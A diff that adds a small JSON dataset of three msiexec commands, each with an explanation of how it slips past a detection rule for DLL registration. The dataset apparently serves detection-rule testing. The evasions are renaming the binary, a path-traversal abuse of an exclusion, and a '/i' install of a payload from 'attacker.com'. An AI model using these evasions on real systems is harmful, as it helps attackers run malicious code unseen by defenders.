@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\msiexec.exe C:\\Users\\Public\\\not\\_msiexec.exe && C:\\Users\\Public\\\not\\_msiexec.exe /y C:\\Path\\To\\Malicious.dll",
+    "explanation": "The rule filters based on the specific process image name ending in '\\msiexec.exe'. By copying the binary to a different location with a different name, the 'selection' criteria for the Image field is bypassed while the functionality remains the same."
+  },
+  {
+    "output": "msiexec.exe /y \"C:\\Windows\\CCM\\..\\..\\Users\\Public\\malicious.dll\"",
+    "explanation": "The rule contains an exclusion (filter\\_apple) for paths starting with 'C:\\Windows\\CCM\\'. By using directory traversal techniques (..\\), an attacker can satisfy the filter's string requirement while actually loading a DLL from a different, attacker-controlled directory."
+  },
+  {
+    "output": "msiexec.exe /i \"http://attacker.com/payload.msi\"",
+    "explanation": "The rule specifically monitors the '/y' (or '-y') switch which is used for DLL registration. It does not account for the '/i' switch, which can be used to execute a malicious MSI package hosted on a remote server, achieving the same goal of proxying execution through a trusted binary."
+  }
+]
